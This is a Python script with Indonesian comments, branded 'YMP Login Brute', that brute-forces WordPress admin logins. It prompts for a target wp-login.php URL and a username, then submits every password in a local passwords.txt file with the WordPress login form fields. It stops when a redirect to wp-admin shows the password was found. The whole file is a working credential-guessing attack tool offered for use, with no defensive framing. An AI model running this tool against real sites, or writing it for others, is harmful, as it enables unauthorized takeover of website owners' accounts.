import os
import requests
from tqdm import tqdm  # Mengimpor tqdm untuk progress bar
from colorama import Fore, Style  # Mengimpor colorama untuk warna

# Fungsi untuk mencoba login dengan menggunakan session untuk menjaga state login
def try_login(session, url, username, password):
    # Data yang dikirimkan pada form login
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': '/wp-admin/',
        'testcookie': 1
    }

    # Mengirim POST request ke server
    response = session.post(url, data=data)

    # Pemeriksaan login berhasil atau gagal berdasarkan URL dan konten halaman
    if "wp-admin" in response.url:
        return True  # Berhasil login (redirect ke wp-admin)
    elif "login" in response.url or "wp-login.php" in response.url:
        return False  # Masih di halaman login (login gagal)
    return False

# Fungsi untuk membersihkan layar (untuk Windows atau Linux/Mac)
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ASCII Art untuk header
ascii_art = """
                                                                                 
__   ____  __ ____    _     ___   ____ ___ _   _   ____  ____  _   _ _____ _____ 
\ \ / |  \/  |  _ \  | |   / _ \ / ___|_ _| \ | | | __ )|  _ \| | | |_   _| ____|
 \ V /| |\/| | |_) | | |  | | | | |  _ | ||  \| | |  _ \| |_) | | | | | | |  _|  
  | | | |  | |  __/  | |__| |_| | |_| || || |\  | | |_) |  _ <| |_| | | | | |___ 
  |_| |_|  |_|_|     |_____\___/ \____|___|_| \_| |____/|_| \_\\___/  |_| |_____|
                                                                                 

            YMP Login Brute
            www.yuk-mari.com
            Tool Version: 1.0.0
            
"""

# Meminta input dari pengguna
clear_screen()  # Bersihkan layar sebelum mulai
print(f"{Fore.CYAN}{ascii_art}{Style.RESET_ALL}")
print(f"{Fore.GREEN}Login Brute Force Tool - Version 1.0.0{Style.RESET_ALL}")
url = input(f"{Fore.YELLOW}Masukkan URL target (contoh: http://192.168.1.3/demo/wp-login.php): {Style.RESET_ALL}")
username = input(f"{Fore.YELLOW}Masukkan username target: {Style.RESET_ALL}")

# Path file password sudah otomatis ditentukan
password_file_path = 'passwords.txt'  # File password sudah ditentukan

# Membaca file password dengan pengaturan encoding yang tepat
with open(password_file_path, 'r', encoding='utf-8-sig') as file:  # Menggunakan utf-8-sig untuk menghapus BOM
    passwords = file.readlines()

# Menggunakan session untuk menjaga cookies
with requests.Session() as session:
    # Menggunakan tqdm untuk membuat progress bar dengan warna dan hiasan
    with tqdm(total=len(passwords), desc=f"{Fore.GREEN}Mencoba password{Style.RESET_ALL}", 
              unit="password", leave=True, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} {desc}") as pbar:
        
        # Menambahkan teks hiasan tambahan
        print(f"{Fore.MAGENTA}Brute-forcing dimulai!{Style.RESET_ALL}")
        
        for password in passwords:
            password = password.strip()  # Menghapus spasi atau karakter lain

            # Cek hasil login
            if try_login(session, url, username, password):
                print(f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} Password ditemukan: {password}")
                pbar.clear()  # Menghapus progress bar setelah berhasil
                break
            pbar.update(1)  # Update progress bar setiap kali iterasi dilakukan

    # Menambahkan teks setelah proses selesai
    print(f"{Fore.CYAN}Proses brute-forcing selesai.{Style.RESET_ALL}")
